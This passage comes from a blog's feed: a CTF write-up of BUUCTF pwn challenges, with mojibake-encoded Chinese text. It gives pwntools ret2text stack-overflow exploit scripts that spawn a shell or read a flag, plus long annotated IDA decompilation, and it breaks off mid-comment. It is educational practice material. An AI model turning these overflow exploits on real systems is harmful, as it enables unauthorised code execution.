    <summary type="html">&lt;h1 id=&quot;0x00-ç»ªè®º&quot;&gt;&lt;a href=&quot;#0x00-ç»ªè®º&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç»ªè®º&quot;&gt;&lt;/a&gt;0x00.ç»ªè®º&lt;/h1&gt;&lt;p&gt;ä¸ºäº†ä¿æŒç¼–ç¨‹çš„ä¸€ä¸ªæ‰‹æ„Ÿï¼ˆæ¯•ç«Ÿç–«æƒ…ä»¥æ¥æ‰“çš„ä»£ç æ¯”ä»¥å‰å°‘å¾—å¤šäº†ï¼‰ï¼ŒåŒæ—¶ä¹Ÿä¸ºäº†æé«˜è‡ªå·±çš„å§¿åŠ¿æ°´å¹³ï¼ˆxï¼‰ï¼Œæ‰“ç®—ä»ä»Šå¤©å¼€å§‹åˆ·Leetcodeæä¾›çš„æ¯æ—¥ä¸€é¢˜å¹¶åœ¨æ­¤åšä¸€ä¸ªå°å°çš„è®°å½•ï¼ˆxï¼‰&lt;/p&gt;
&lt;p&gt;å¸Œæœ›å‡ å¹´ä»¥åè¿™é‡Œå·²ç»ç§¯ç´¯äº†ä¸Šåƒé“é¢˜â‘§ï¼ˆ&lt;del&gt;æ²¡å¯èƒ½çš„&lt;/del&gt;&lt;/p&gt;
&lt;img src=&quot;https://i.loli.net/2020/10/15/rqasE7pNAxQXy9l.png&quot; alt=&quot;image.png&quot; style=&quot;zoom:50%;&quot; /&gt;</summary>
    
    
    
    <category term="Online Judge" scheme="http://archive.next.arttnba3.cn/categories/Online-Judge/"/>
    
    
    <category term="ç®—æ³•" scheme="http://archive.next.arttnba3.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="C/C++" scheme="http://archive.next.arttnba3.cn/tags/C-C/"/>
    
    <category term="é¢˜è§£" scheme="http://archive.next.arttnba3.cn/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="é“¾è¡¨" scheme="http://archive.next.arttnba3.cn/tags/%E9%93%BE%E8%A1%A8/"/>
    
    <category term="Leetcode" scheme="http://archive.next.arttnba3.cn/tags/Leetcode/"/>
    
    <category term="åŠ¨æ€è§„åˆ’" scheme="http://archive.next.arttnba3.cn/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    
    <category term="æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰" scheme="http://archive.next.arttnba3.cn/tags/%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2%EF%BC%88DFS%EF%BC%89/"/>
    
    <category term="åŒæŒ‡é’ˆ" scheme="http://archive.next.arttnba3.cn/tags/%E5%8F%8C%E6%8C%87%E9%92%88/"/>
    
    <category term="æ ‘" scheme="http://archive.next.arttnba3.cn/tags/%E6%A0%91/"/>
    
    <category term="äºŒå‰æ ‘" scheme="http://archive.next.arttnba3.cn/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    
    <category term="å“ˆå¸Œè¡¨" scheme="http://archive.next.arttnba3.cn/tags/%E5%93%88%E5%B8%8C%E8%A1%A8/"/>
    
    <category term="å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰" scheme="http://archive.next.arttnba3.cn/tags/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2%EF%BC%88BFS%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>ã€CTFé¢˜è§£-0x04ã€‘BUUCTF-Pwn write up by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/09/08/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x04%E3%80%91BUUOJ-Pwn-write-up-by-arttnb3/"/>
    <id>http://archive.next.arttnba3.cn/2020/09/08/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x04%E3%80%91BUUOJ-Pwn-write-up-by-arttnb3/</id>
    <published>2020-09-07T18:09:30.000Z</published>
    <updated>2021-01-22T15:10:22.058Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x000-ç»ªè®º"><a href="#0x000-ç»ªè®º" class="headerlink" title="0x000.ç»ªè®º"></a>0x000.ç»ªè®º</h1><p><a href="buuoj.cn">BUUCTF</a>æ˜¯ä¸€ä¸ªå·¨å‹CTFé¢˜åº“ï¼Œå¤§è‡´å¯ä»¥ç±»æ¯”OIerä»¬çš„æ´›è°·ä¸€æ ·çš„åœ°æ–¹ï¼Œåœ¨BUUCTFä¸Šæœ‰ç€åˆ†ç±»é½å…¨æ•°é‡åºå¤§çš„å„æ–¹å‘é¢˜ç›®ï¼ŒåŒ…æ‹¬å„å¤§CTFçš„åŸé¢˜</p><p>æ­£æ‰€è°“â€ä¸åˆ·BUUéCTFerâ€œï¼ˆ<del>å“ªé‡Œæœ‰è¿‡è¿™ç§å¥‡æ€ªçš„è¯å•¦</del>ï¼‰ï¼Œä½œä¸ºä¸€åæ–°æ™‹çš„è’Ÿè’»CTFer&amp;ç½‘å®‰ä¸“ä¸šé€‰æ‰‹ï¼Œå’±ä¹Ÿæ¥åšä¸€åšBUUCTFä¸Šçš„é¢˜ï¼Œå¹¶æŠŠé¢˜è§£åœ¨åšå®¢ä¸Šå­˜æ¡£ä¸€ä»½æ–¹ä¾¿åæ¥è€…å­¦ä¹ ï¼ˆ<del>å¿«é†’é†’ï¼Œå“ªé‡Œä¼šæœ‰äººçœ‹ä½ çš„åšå®¢å•¦XD</del></p><p>Baby Pwneråšçš„éƒ½æ˜¯pwné¢˜ï¼Œç‚¹å¼€å³å¯æŸ¥çœ‹é¢˜è§£ğŸ‘‡</p><blockquote><p>æ³¨ï¼šæˆ‘ä¼šåœ¨é¢˜ç›®çš„æ—è¾¹å†™ä¸Šè€ƒç‚¹</p></blockquote><span id="more"></span><h1 id="0x001-test-your-nc-nc"><a href="#0x001-test-your-nc-nc" class="headerlink" title="0x001.test your nc - nc"></a>0x001.test your nc - nc</h1><p>æ‹–å…¥IDAåˆ†æï¼Œå‘ç°ä¸€è¿è¡Œå°±èƒ½ç›´æ¥getshell</p><p><img src="https://i.loli.net/2020/08/15/AqJPwtME8FmvHos.png" alt="image.png"></p><p>ncï¼ŒæˆåŠŸgetshellï¼Œå¾—flag</p><p><img src="https://i.loli.net/2020/08/15/5Ze2Nw94jmRxUJF.png" alt="image.png"></p><h1 id="0x002-rip-ret2text"><a href="#0x002-rip-ret2text" class="headerlink" title="0x002.rip - ret2text"></a>0x002.rip - ret2text</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œä¿æŠ¤å…¨å…³</p><p><img src="https://i.loli.net/2020/08/14/HPO2siU8DpyfnYG.png" alt="image.png"></p><p>ä¸»å‡½æ•°ä½¿ç”¨äº†getså‡½æ•°ï¼Œå­˜åœ¨æ ˆæº¢å‡ºï¼Œåç§»é‡ä¸º0xf+8ä¸ªå­—èŠ‚</p><p><img src="https://i.loli.net/2020/08/14/NxMSvtUf7wZ9iY4.png" alt="image.png"></p><p>å¯ä»¥å‘ç°ç›´æ¥å­˜åœ¨ä¸€ä¸ª<code>system(&quot;/bin/sh&quot;)</code>ï¼Œè¿”å›åˆ°è¿™é‡Œå³å¯getshell</p><p><img src="https://i.loli.net/2020/08/14/rhUu8p2mc6MyXsi.png" alt="image.png"></p><p>æ„é€ payloadå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0xf</span> + <span class="number">8</span>) + p64(<span class="number">0x40118a</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./rip&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,26914)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¾“å…¥æˆ‘ä»¬çš„<code>payload</code>ï¼Œç›´æ¥getshellï¼Œå¾—åˆ°flag</p><p><img src="https://i.loli.net/2020/08/14/7fGrIXzylhN49YM.png" alt="image.png"></p><h1 id="0x003-warmup-csaw-2016-ret2text"><a href="#0x003-warmup-csaw-2016-ret2text" class="headerlink" title="0x003.warmup_csaw_2016 - ret2text"></a>0x003.warmup_csaw_2016 - ret2text</h1><p>æƒ¯ä¾‹<code>checksec</code>ï¼Œä¿æŠ¤å…¨å…³ï¼Œå¯ä»¥ä¸ºæ‰€æ¬²ä¸º</p><p><img src="https://i.loli.net/2020/08/15/2Oy9SNjZuKEI75t.png" alt="image.png"></p><p>æ‹–å…¥IDAï¼Œå‘ç°å¯ä»¥æº¢å‡ºçš„<code>gets</code>å‡½æ•°ï¼Œåç§»é‡æ˜¯0x40+8ä¸ªå­—èŠ‚</p><p><img src="https://i.loli.net/2020/08/15/UcPklJTz8G5brHx.png" alt="image.png"></p><p>åˆå‘ç°ä¸€ä¸ªå¯ä»¥è·å¾—flagçš„gadget<code>system(&quot;cat flag.txt&quot;)</code>ï¼Œæ§åˆ¶ç¨‹åºè¿”å›åˆ°è¿™é‡Œå³å¯è·å¾—flag</p><p><img src="https://i.loli.net/2020/08/15/KLPE8bTj2kWszU3.png" alt="image.png"></p><p>æ•…æ„é€ payloadå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>* (<span class="number">0x40</span> + <span class="number">8</span>) + p64(<span class="number">0x400611</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./warm_up_2016&#x27;</span>)<span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,28660)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¾“å…¥æˆ‘ä»¬çš„payloadï¼Œå¾—åˆ°flag</p><p><img src="https://i.loli.net/2020/08/15/V6ZjsuOYfCUhMLJ.png" alt="image.png"></p><h1 id="0x004-pwn1-sctf-2016-ret2text"><a href="#0x004-pwn1-sctf-2016-ret2text" class="headerlink" title="0x004.pwn1_sctf_2016 - ret2text"></a>0x004.pwn1_sctf_2016 - ret2text</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†NXä¿æŠ¤</p><p><img src="https://i.loli.net/2020/09/07/NAUM59LC7FSuZ6V.png" alt="image.png"></p><p>æ‹–å…¥IDAçœ‹ä¸€ä¸‹ï¼Œ<del>ç„¶åä½ å°±ä¼šå‘ç°C++é€†å‘å‡ºæ¥çš„ä¸œè¥¿æ¯”**è¿˜**</del></p><p><img src="https://i.loli.net/2020/09/07/5FsRKWxZSiME8ug.png" alt="image.png"></p><p>æˆ‘ä»¬ä¸éš¾çœ‹å‡ºreplaceå‡½æ•°æ˜¯åœ¨è¯¥ç¨‹åºä¸­çš„ä¸€ä¸ªæ¯”è¾ƒå…³é”®çš„å‡½æ•°ï¼Œæˆ‘ä»¬å…ˆè¿›å»ç®€å•çœ‹çœ‹ï¼š</p><p><img src="https://i.loli.net/2020/09/07/vwAz9J8tIlN5DpB.png" alt="image.png"></p><p>ç®€å•é€šè¯»ä¸€ä¸‹æˆ‘ä»¬å¤§æ¦‚çŸ¥é“è¿™æ®µä»£ç çš„è¿è¡Œè¿‡ç¨‹å¦‚ä¸‹ï¼šï¼ˆ<del>ä¸å°±æ˜¯**ğŸæœ‰ä»€ä¹ˆè¯»ä¸æ‡‚çš„ï¼Œå¹²ä»–å°±å®Œäº‹äº†</del></p><p><img src="https://i.loli.net/2020/09/08/U7P6A1HlfkZGsXi.png" alt="image.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::string *__stdcall <span class="title">replace</span><span class="params">(std::string *a1, std::string *a2, std::string *a3, std::string *a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [esp+10h] [ebp-48h]</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [esp+14h] [ebp-44h]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [esp+1Bh] [ebp-3Dh]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+1Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// [esp+20h] [ebp-38h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+24h] [ebp-34h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+28h] [ebp-30h]</span></span><br><span class="line">  <span class="type">char</span> v15; <span class="comment">// [esp+2Fh] [ebp-29h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp+30h] [ebp-28h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [esp+34h] [ebp-24h]</span></span><br><span class="line">  <span class="type">char</span> v18; <span class="comment">// [esp+38h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [esp+3Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [esp+40h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [esp+44h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> v22; <span class="comment">// [esp+48h] [ebp-10h]</span></span><br><span class="line">  <span class="type">char</span> v23; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line">                                                <span class="comment">// æ¥æ”¶å‚æ•°ä¸ºï¼šv6,input,v9,v7</span></span><br><span class="line">                                                <span class="comment">// å…¶ä¸­inputä¸ºæˆ‘ä»¬çš„è¾“å…¥ï¼Œv9ä¸ºå­—ç¬¦ä¸²&quot;I&quot;ï¼Œv7ä¸ºå­—ç¬¦ä¸²&quot;you&quot;</span></span><br><span class="line">                                                <span class="comment">// æŸ¥æ±‡ç¼–æºç å¯çŸ¥ä¸‹é¢çš„stringåŸºæœ¬éƒ½æ˜¯a2ï¼Œä¹Ÿå°±æ˜¯input</span></span><br><span class="line">  <span class="keyword">while</span> ( std::string::<span class="built_in">find</span>(a2, a3, <span class="number">0</span>) != <span class="number">-1</span> )  <span class="comment">// åœ¨inputä¸­å¯»æ‰¾å­—ç¬¦ä¸²v9ï¼ˆ&quot;I&quot;ï¼‰ï¼Œå¦‚æœæ‰¾ä¸åˆ°åˆ™findæ–¹æ³•ä¼šè¿”å›-1ï¼Œè·³å‡ºå¾ªç¯</span></span><br><span class="line">  &#123;</span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v10);      <span class="comment">// æ–°æ„é€ äº†ä¸€ä¸ªallocator&lt;char&gt;ç±»çš„å®ä¾‹å¹¶å°†åœ°å€ç»™åˆ°v10</span></span><br><span class="line">    v11 = std::string::<span class="built_in">find</span>(a2, a3, <span class="number">0</span>);         <span class="comment">// è·å¾—&quot;I&quot;å­—ç¬¦ä¸²åœ¨inputä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä¸‹æ ‡</span></span><br><span class="line">    std::string::<span class="built_in">begin</span>(&amp;v12);                   <span class="comment">// input.begin()æ–°æ„é€ ä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡å¹¶å°†åœ°å€ç»™åˆ°v12</span></span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::string&gt;::<span class="keyword">operator</span>+(&amp;v13);<span class="comment">// æ„å»ºoperator+çš„è¿­ä»£å™¨å¯¹è±¡å®ä¾‹ç»™åˆ°v13</span></span><br><span class="line">    std::string::<span class="built_in">begin</span>(&amp;v14);                   <span class="comment">// input.begin()æ–°æ„é€ ä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡å¹¶å°†åœ°å€ç»™åˆ°v14</span></span><br><span class="line">    std::string::string&lt;__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::string&gt;&gt;(&amp;v9, v14, v13, &amp;v10);<span class="comment">// v14è¿­ä»£ç”Ÿæˆçš„å­—ç¬¦ä½¿ç”¨allocatorï¼ˆv10ï¼‰åˆ†é…å†…å­˜ã€ä½¿ç”¨operator+ï¼ˆv13ï¼‰æ¥æˆæ–°å­—ç¬¦ä¸²ç»™åˆ°v8</span></span><br><span class="line">                                                <span class="comment">// æŸ¥çœ‹æ±‡ç¼–å¯çŸ¥ç”Ÿæˆçš„å­—ç¬¦ä¸²é•¿åº¦ä¸ºv11ï¼ˆå³ç”Ÿæˆçš„å­—ç¬¦ä¸²ä¸ºinputä¸­ç¬¬ä¸€ä¸ª&quot;I&quot;çš„å‰é¢æ‰€æœ‰å­—ç¬¦æ„æˆçš„å­—ç¬¦ä¸²</span></span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v10, v4); <span class="comment">// ææ„v10</span></span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v15);      <span class="comment">// æ–°æ„é€ äº†ä¸€ä¸ªallocator&lt;char&gt;ç±»çš„å®ä¾‹å¹¶å°†åœ°å€ç»™åˆ°v15</span></span><br><span class="line">    std::string::<span class="built_in">end</span>(&amp;v16);                     <span class="comment">// input.end()æ–°æ„é€ ä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡å¹¶å°†åœ°å€ç»™åˆ°v16</span></span><br><span class="line">    v17 = std::string::<span class="built_in">length</span>(a3);              <span class="comment">// è·å¾—&quot;I&quot;çš„é•¿åº¦ç»™åˆ°v17</span></span><br><span class="line">    v19 = std::string::<span class="built_in">find</span>(a2, a3, <span class="number">0</span>);         <span class="comment">// è·å¾—&quot;I&quot;å­—ç¬¦ä¸²åœ¨inputä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä¸‹æ ‡ç»™åˆ°v19</span></span><br><span class="line">    std::string::<span class="built_in">begin</span>(&amp;v20);                   <span class="comment">// begin()æ–°æ„é€ ä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡å¹¶å°†åœ°å€ç»™åˆ°v20</span></span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::string&gt;::<span class="keyword">operator</span>+(&amp;v18);<span class="comment">// æ„å»ºoperator+çš„è¿­ä»£å™¨å¯¹è±¡å®ä¾‹ç»™åˆ°v18</span></span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::string&gt;::<span class="keyword">operator</span>+(&amp;v21);<span class="comment">// æ„å»ºoperator+çš„è¿­ä»£å™¨å¯¹è±¡å®ä¾‹ç»™åˆ°v21</span></span><br><span class="line">    std::string::string&lt;__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::string&gt;&gt;(&amp;v8, v21, v16, &amp;v15);<span class="comment">// v16è¿­ä»£ç”Ÿæˆçš„å­—ç¬¦ä½¿ç”¨allocatorï¼ˆv15ï¼‰åˆ†é…å†…å­˜ã€ä½¿ç”¨operator+ï¼ˆv21ï¼‰æ¥æˆæ–°å­—ç¬¦ä¸²ç»™åˆ°v8</span></span><br><span class="line">                                                <span class="comment">// æ³¨æ„åœ¨è¿™é‡Œå’Œå‰é¢çš„ç›¸ä¼¼è¯­å¥ä¸­å­—ç¬¦ä¸²è¿­ä»£å™¨ä¸operatoræ‰€ä¼ å…¥çš„ä½ç½®æ˜¯ç›¸åçš„</span></span><br><span class="line">                                                <span class="comment">// å¯èƒ½æ˜¯å› ä¸ºè¿­ä»£å™¨ä»åå¾€å‰ç”Ÿæˆå­—ç¬¦ä¸²ï¼Ÿ</span></span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v15, v5); <span class="comment">// ææ„v15</span></span><br><span class="line">    std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;(&amp;v23, &amp;v9, a4);<span class="comment">// v9+a4ç”Ÿæˆçš„å­—ç¬¦ä¸²ç»™åˆ°v23</span></span><br><span class="line">                                                <span class="comment">// å³inputä¸­ç¬¬ä¸€ä¸ª&quot;I&quot;ä¹‹å‰çš„æ‰€æœ‰å­—ç¬¦æ„æˆçš„å­—ç¬¦ä¸²å†åŠ ä¸Š&quot;you&quot;ç”Ÿæˆæ–°å­—ç¬¦ä¸²v23</span></span><br><span class="line">    std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;(&amp;v22, &amp;v23, &amp;v8);<span class="comment">// v23+v8ç”Ÿæˆçš„å­—ç¬¦ä¸²ç»™åˆ°v22</span></span><br><span class="line">                                                <span class="comment">// å³v23å†åŠ ä¸ŠåŸinputä¸­ç¬¬ä¸€ä¸ª&quot;I&quot;ä¹‹åçš„æ‰€æœ‰å­—ç¬¦æ„æˆçš„å­—ç¬¦ä¸²ç”Ÿæˆæ–°å­—ç¬¦ä¸²v22</span></span><br><span class="line">    std::string::<span class="keyword">operator</span>=(a2, &amp;v22, v6);       <span class="comment">// v22ç»™å›åˆ°a2ï¼ˆä¹Ÿå°±æ˜¯input</span></span><br><span class="line">    std::string::~<span class="built_in">string</span>(&amp;v22);                 <span class="comment">// ææ„v20</span></span><br><span class="line">    std::string::~<span class="built_in">string</span>(&amp;v23);                 <span class="comment">// ææ„v21</span></span><br><span class="line">    std::string::~<span class="built_in">string</span>(&amp;v8);                  <span class="comment">// ææ„v8</span></span><br><span class="line">    std::string::~<span class="built_in">string</span>(&amp;v9);                  <span class="comment">// ææ„v9</span></span><br><span class="line">  &#125;</span><br><span class="line">  std::string::<span class="built_in">string</span>(a1, a2);                  <span class="comment">// æ‹·è´inputåˆ°a1ï¼ˆvulnä¸­v6ï¼‰</span></span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å¤§æ¦‚çŸ¥é“replaceå‡½æ•°çš„ä½œç”¨å…¶å®æ˜¯æŠŠ<strong>è¾“å…¥çš„å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰å­—ä¸²Aæ›¿æ¢æˆå­—ç¬¦ä¸²Bå†é‡æ–°ç”Ÿæˆæ–°çš„å­—ç¬¦ä¸²</strong>ï¼Œè€Œåœ¨vulnå‡½æ•°ä¸­Aå³ä¸º<code>&quot;I&quot;</code>ï¼ŒBå³ä¸º<code>&quot;you&quot;</code>ã€‚</p><p>é‡æ–°å›åˆ°<code>vuln</code>å‡½æ•°ï¼Œæˆ‘ä»¬å‘ç°ä¾ç„¶çœ‹ä¸æ‡‚è¿™æ®µä»£ç åˆ°åº•å¹²äº†å•¥</p><p>è¿™ä¸ªæ—¶å€™å…¶å®æˆ‘ä»¬å¯ä»¥é€‰æ‹©çœ‹æ±‡ç¼–ä»£ç è¿›è¡Œè¾…åŠ©é˜…è¯»ï¼ˆ<del>C++é€†å‘å‡ºæ¥çš„ä¸œè¥¿çœŸçš„å¤ª**äº†</del></p><p><img src="https://i.loli.net/2020/09/07/SCp5I7mvXc9HDWQ.png" alt="image.png"></p><p>ç®€å•ç»“åˆä¸€ä¸‹æ±‡ç¼–ä»£ç ä¸é€†å‘å‡ºæ¥çš„C++ä»£ç ï¼Œæˆ‘ä»¬å®¹æ˜“çŸ¥é“è¯¥æ®µä»£ç çš„ä½œç”¨ï¼Œå¦‚ä¸‹å›¾æ³¨é‡Šæ‰€ç¤ºï¼š</p><p><img src="https://i.loli.net/2020/09/07/vTxCYDnofhqdSKQ.png" alt="image.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fgets</span>(&amp;s, <span class="number">32</span>, edata);                         <span class="comment">// ä»æ ‡å‡†è¾“å…¥æµä¸­è¯»å…¥æœ€å¤§32ä¸ªå­—ç¬¦åˆ°s</span></span><br><span class="line">std::string::<span class="keyword">operator</span>=(&amp;input, &amp;s);           <span class="comment">// å°†å­—ç¬¦ä¸²sçš„å€¼æ‹·è´åˆ°stringç±»inputä¸­</span></span><br><span class="line">std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>((<span class="type">int</span>)&amp;v8);    <span class="comment">// æ–°æ„é€ äº†ä¸€ä¸ªallocator&lt;char&gt;ç±»çš„å®ä¾‹å¹¶å°†åœ°å€ç»™åˆ°v8</span></span><br><span class="line">std::string::<span class="built_in">string</span>((<span class="type">int</span>)&amp;v7, (<span class="type">int</span>)<span class="string">&quot;you&quot;</span>, (<span class="type">int</span>)&amp;v8);<span class="comment">// stringç±»ä½¿ç”¨allocratoråˆ†é…å†…å­˜å¤åˆ¶å­—ç¬¦ä¸²&quot;you&quot;å¹¶æ‹·è´åˆ°v7ä¸Š</span></span><br><span class="line">std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>((<span class="type">int</span>)&amp;v10);   <span class="comment">// æ–°æ„é€ äº†ä¸€ä¸ªallocator&lt;char&gt;ç±»çš„å®ä¾‹å¹¶å°†åœ°å€ç»™åˆ°v10</span></span><br><span class="line">std::string::<span class="built_in">string</span>((<span class="type">int</span>)&amp;v9, (<span class="type">int</span>)<span class="string">&quot;I&quot;</span>, (<span class="type">int</span>)&amp;v10);<span class="comment">// stringç±»ä½¿ç”¨allocratoråˆ†é…å†…å­˜å¤åˆ¶å­—ç¬¦ä¸²&quot;I&quot;å¹¶æ‹·è´åˆ°v6ä¸Š</span></span><br><span class="line"><span class="built_in">replace</span>((std::string *)&amp;v6, (std::string *)&amp;input, (std::string *)&amp;v9);<span class="comment">// éå†inputï¼Œç”Ÿæˆæ–°stringæŠŠåŸinputä¸­çš„&#x27;I&#x27;æ›¿æ¢ä¸º&#x27;you&#x27;ï¼Œå¹¶å°†é‡æ–°ç”Ÿæˆåçš„å­—ç¬¦ä¸²åœ°å€ç»™åˆ°v6</span></span><br><span class="line">std::string::<span class="keyword">operator</span>=(&amp;input, &amp;v6, v0);      <span class="comment">// æ‹·è´v6å›åˆ°inputä¸­ï¼Œå®Œæˆæ›¿æ¢</span></span><br><span class="line">std::string::~<span class="built_in">string</span>((std::string *)&amp;v6);     <span class="comment">// ææ„v6</span></span><br><span class="line">std::string::~<span class="built_in">string</span>((std::string *)&amp;v9);     <span class="comment">// ææ„v9</span></span><br><span class="line">std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v10, v1);   <span class="comment">// ææ„v10</span></span><br><span class="line">std::string::~<span class="built_in">string</span>((std::string *)&amp;v7);     <span class="comment">// ææ„v7</span></span><br><span class="line">std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v8, v2);    <span class="comment">// ææ„v8</span></span><br><span class="line">v3 = (<span class="type">const</span> <span class="type">char</span> *)std::string::<span class="built_in">c_str</span>((std::string *)&amp;input);<span class="comment">// å°†inputä½¿ç”¨stringç±»çš„c_strå‡½æ•°å˜æˆå­—ç¬¦ä¸²å­˜æ”¾åœ¨charæ•°ç»„ä¸­å¹¶å°†å­—ç¬¦ä¸²æŒ‡é’ˆèµ‹ç»™v3</span></span><br><span class="line"><span class="built_in">strcpy</span>(&amp;s, v3);                               <span class="comment">// 